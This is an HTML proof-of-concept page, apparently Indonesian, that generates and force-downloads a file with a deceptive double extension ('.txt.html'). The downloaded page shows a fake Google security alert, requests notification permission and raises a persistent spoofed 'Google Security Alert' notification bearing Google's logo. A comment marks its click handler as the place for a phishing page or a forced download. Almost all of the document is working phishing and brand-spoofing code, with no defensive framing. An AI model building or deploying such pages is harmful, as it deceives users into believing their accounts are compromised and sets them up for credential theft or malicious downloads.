<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Chaining: Alert -> Fake Google Notification</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Chaining: Fake Google Notification</h2>
<p>Mengunduh file .txt.html yang saat dibuka akan memunculkan alert, lalu memaksa notifikasi sistem palsu (Google).</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
<div id="status" role="status">Sistem siap.</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>Security Alert</title></head>" +
            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
            "    <h2 style='color:#ff4444;margin-bottom:10px;'>⚠️ Security Alert</h2>" +
            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Kami mendeteksi adanya aktivitas mencurigakan pada akun Google Anda. Klik OK pada notifikasi untuk mengamankan akun.</p>" +
            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menunggu konfirmasi...</p>" +
            "</div>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            
            "var sudah = false;" +
            
            "function picuNotifikasi(){" +
            "    if (sudah) return;" +
            "    sudah = true;" +
            "    var statusEl = document.getElementById('status');" +
            
            // 1. Munculkan Alert (sebagai pemicu User Gesture)
            "    try { alert('Peringatan Keamanan Google: Akun Anda terindikasi diretas. Klik OK untuk memeriksa.'); } catch(e){}" +
            
            // 2. Setelah OK diklik, eksekusi Notification API
            "    if (!('Notification' in window)) {" +
            "        statusEl.textContent = 'Browser tidak mendukung notifikasi.';" +
            "        return;" +
            "    }" +
            
            "    if (Notification.permission === 'granted') {" +
            "        tampilkanNotif();" +
            "    } else if (Notification.permission !== 'denied') {" +
            "        Notification.requestPermission().then(function(permission) {" +
            "            if (permission === 'granted') {" +
            "                tampilkanNotif();" +
            "            } else {" +
            "                statusEl.textContent = 'Izin notifikasi ditolak.';" +
            "            }" +
            "        });" +
            "    }" +
            "}" +
            
            "function tampilkanNotif(){" +
            "    var statusEl = document.getElementById('status');" +
            "    try {" +
            // Memalsukan Notifikasi Google (Ikon & Judul)
            "        var notif = new Notification('Google Security Alert', {" +
            "            body: 'Sesi login tidak dikenal terdeteksi. Klik untuk mengamankan akun Anda.'," +
            "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
            "            badge: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'," +
            "            tag: 'google-security'," +
            "            requireInteraction: true" + // Notifikasi tidak hilang sampai diklik
            "        });" +
            
            // Aksi saat notifikasi diklik
            "        notif.onclick = function() {" +
            "            window.focus();" +
            // Arahkan ke halaman phishing atau picu unduhan
            "            window.location.href = 'https://accounts.google.com'; " + 
            "        };" +
            "        statusEl.textContent = 'Notifikasi Google palsu berhasil ditampilkan!' ;" +
            "        statusEl.style.color = '#0f0';" +
            "    } catch(e) {" +
            "        statusEl.textContent = 'Gagal menampilkan notifikasi: ' + e.message;" +
            "    }" +
            "}" +
            
            // TRIGGER: Klik di mana saja memicu alert & notifikasi
            "document.addEventListener('click', picuNotifikasi);" +
            "document.addEventListener('touchstart', picuNotifikasi);" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    link.download = `google-security-${fileData.id}.txt.html`; // Ekstensi ganda
    link.textContent = `Download google-security.txt.html`;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    statusDiv.textContent = "Menyiapkan file Fake Notification...";

    speak("Menyiapkan file notifikasi palsu.");

    const root = document.documentElement;
    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}

    setTimeout(async () => {
        try {
            const fileData = await prepareMimeBlobAsync(1);
            activeUrls.push(fileData.url);
            triggerInstantDownload(fileData);
            statusDiv.textContent = "File berhasil diunduh. Buka file dan klik layar.";
        } catch(e) {
            statusDiv.textContent = "Gagal: " + e.message;
        }
        isProcessing = false;
        startBtn.disabled = false;
    }, 300);
});
</script>
</body>
</html>
